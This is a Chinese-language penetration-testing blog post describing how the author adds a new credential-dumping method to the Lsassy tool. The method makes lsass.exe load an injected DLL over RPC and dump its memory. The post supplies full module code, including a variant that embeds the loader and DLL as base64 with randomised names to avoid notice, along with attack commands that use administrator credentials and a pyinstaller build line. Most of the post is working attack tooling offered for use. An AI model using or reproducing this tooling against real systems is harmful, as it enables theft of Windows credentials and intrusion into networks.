---
layout: post
title: Lsassy二次开发——添加dump方法
---


## 0x00 前言
---

在之前的文章《渗透基础——远程从lsass.exe进程导出凭据》介绍了[Lsassy](https://github.com/Hackndo/lsassy)的用法，[Lsassy](https://github.com/Hackndo/lsassy)能够实现远程从lsass.exe进程导出凭据。本文将要在[Lsassy](https://github.com/Hackndo/lsassy)的基础上进行二次开发，添加一个导出凭据的方法，记录细节。

## 0x01 简介
---

本文将要介绍以下内容：

- 二次开发的细节
- 开源代码

## 0x02 导出凭据的方法
---

在之前的文章[《渗透基础——从lsass.exe进程导出凭据》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8Elsass.exe%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE)提到过使用RPC控制lsass加载SSP的方式向lsass.exe进程注入dll，由dll来实现dump的功能，这个方法是[Lsassy](https://github.com/Hackndo/lsassy)缺少的

这个方法共分为两部分：

#### (1)加载器

使用RPC控制lsass进程加载dll文件

可参考XPN开源的代码：

https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e

在编译代码时，为了提高通用性，编译选项选择`在静态库中使用MFC`，在原代码的基础上添加如下代码：

```
#pragma comment(lib, "Rpcrt4.lib")
```

编译代码生成文件rpcloader.exe

#### (2)dll文件

dll文件实现从lsass.exe进程导出凭据，代码可参考：

https://github.com/outflanknl/Dumpert/blob/master/Dumpert-DLL/Outflank-Dumpert-DLL/Dumpert.c

dll加载时会将dump文件保存为`c:\windows\Temp\dumpert.dmp`

编译代码生成文件dumpert.dll

经过以上操作，得到文件rpcloader.exe和dumpert.dll，作为二次开发的准备

## 0x03 二次开发的细节
---

### 1.添加一个需要指定文件路径的dump方法

格式参考：https://github.com/Hackndo/lsassy/blob/master/lsassy/dumpmethod/dummy.py.tpl

根据参考格式写出模块代码，我这里额外做了一些标记，细节如下：

```
from lsassy.dumpmethod import IDumpMethod, Dependency

class DumpMethod(IDumpMethod):
    custom_dump_path_support = False
    custom_dump_name_support = False

    dump_name = "dumpert.dmp" 								//进程dump文件保存的文件名
    dump_share = "C$"										//进程dump文件保存的磁盘
    dump_path = "\\Windows\\Temp\\"							//进程dump文件保存的路径

    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.loader = Dependency("rpcloader", "rpc.exe") 	//rpcloader为命令行使用的参数名，rpc.exe为上传文件保存的文件名
        self.dll = Dependency("dll", "rpc.dll")				//dll为命令行使用的参数名，rpc.dll为上传文件保存的文件名

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.loader, self.dll])  //确认命令行参数是否正确

    def clean(self):
        self.clean_dependencies([self.loader, self.dll]) 					//清除上传的文件

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{} {}""".format(
            self.loader.get_remote_path(),self.dll.get_remote_path()		//执行的命令：c:\windows\temp\rpc.exe c:\windows\temp\rpc.dll
        )
        pwsh_command = """{} {}""".format(
            self.loader.get_remote_path(),self.dll.get_remote_path()
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
```

将以上代码保存至`<python>\Lib\site-packages\lsassy\dumpmethod\rawrpc.py`

**注：**

上传的文件可以使用随机名称，代码`self.loader = Dependency("rpcloader", "rpc.exe")`
可修改为`self.loader = Dependency("rpcloader", ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".exe")`，代码`self.dll = Dependency("dll", "rpc.dll")`可修改为`self.dll = Dependency("dll", ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll")`

测试命令：

```
lsassy -u Administrator -p Password1 192.168.1.1 -m rawrpc -O rpcloader_path=c:\test\rpcloader.exe,dll_path=c:\test\dumpert.dll
```

该方法会将本地的`c:\test\rpcloader.exe`和`c:\test\dumpert.dll`复制到远程主机并命名为`c:\windows\temp\rpc.exe`和`c:\windows\temp\rpc.dll`，将lsass进程的dump文件保存为`c:\windows\temp\dumpert.dmp`

### 2.添加一个全自动的dump方法

为了使以上整个过程自动化，这里可以选择将exe和dll文件作base64编码保存在变量中

base64编码的实现代码：

```
import base64
with open("rpcloader.exe", 'rb') as fr:
    content = fr.read()
    data1 = base64.b64encode(content).decode('utf8')  
with open("rpcloader-base64.txt", "w") as fw:
    fw.write(data1)
with open("dumpert.dll", 'rb') as fr:
    content = fr.read()
    data1 = base64.b64encode(content).decode('utf8')  
with open("dumpert-base64.txt", "w") as fw:
    fw.write(data1)
```

将生成rpcloader-base64.txt和dumpert-base64.txt替换以下代码中的`<base64>`

```
import base64
import random
import string

from lsassy.dumpmethod import IDumpMethod, Dependency

class DumpMethod(IDumpMethod):
    custom_dump_path_support = False
    custom_dump_name_support = False

    dump_name = "dumpert.dmp"
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"

    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.loader = Dependency("rpcloader", ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".exe")
        self.loader.content = base64.b64decode("<base64>")
        self.dll = Dependency("dll", ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll")
        self.dll.content = base64.b64decode("<base64>")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.loader, self.dll])

    def clean(self):
        self.clean_dependencies([self.loader, self.dll])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{} {}""".format(
            self.loader.get_remote_path(),self.dll.get_remote_path()
        )
        pwsh_command = """{} {}""".format(
            self.loader.get_remote_path(),self.dll.get_remote_path()
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
```

将以上代码保存至`<python>\Lib\site-packages\lsassy\dumpmethod\rawrpc_embedded.py`

测试命令：

```
lsassy -u Administrator -p Password1 192.168.1.1 -m rawrpc_embedded
```

### 3.打包成exe文件

完整的打包命令：

```
pyinstaller -F console.py --hidden-import unicrypto.backends.pure.DES --hidden-import unicrypto.backends.pure.TDES --hidden-import unicrypto.backends.pure.AES --hidden-import unicrypto.backends.pure.RC4 --hidden-import lsassy.dumpmethod.comsvcs --hidden-import lsassy.dumpmethod.comsvcs_stealth --hidden-import lsassy.dumpmethod.dllinject --hidden-import lsassy.dumpmethod.dumpert --hidden-import lsassy.dumpmethod.dumpertdll --hidden-import lsassy.dumpmethod.edrsandblast --hidden-import lsassy.dumpmethod.mirrordump --hidden-import lsassy.dumpmethod.mirrordump_embedded --hidden-import lsassy.dumpmethod.nanodump --hidden-import lsassy.dumpmethod.ppldump --hidden-import lsassy.dumpmethod.ppldump_embedded --hidden-import lsassy.dumpmethod.procdump --hidden-import lsassy.dumpmethod.procdump_embedded --hidden-import lsassy.dumpmethod.rdrleakdiag --hidden-import lsassy.dumpmethod.wer --hidden-import lsassy.exec.mmc --hidden-import lsassy.exec.smb --hidden-import lsassy.exec.smb_stealth --hidden-import lsassy.exec.task --hidden-import lsassy.exec.wmi --hidden-import lsassy.output.grep_output --hidden-import lsassy.output.json_output --hidden-import lsassy.output.pretty_output --hidden-import lsassy.output.table_output --hidden-import lsassy.dumpmethod.rawrpc --hidden-import lsassy.dumpmethod.rawrpc_embedded
```

## 0x04 小结
---

[Lsassy](https://github.com/Hackndo/lsassy)将不同的功能模块化，结构设置合理，添加dump方法仅需要修改Dumper module对应的实现代码。我已经将新添加的模块推送至[Lsassy](https://github.com/Hackndo/lsassy)，在最新版的[Lsassy](https://github.com/Hackndo/lsassy)可以直接使用这个模块。




---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



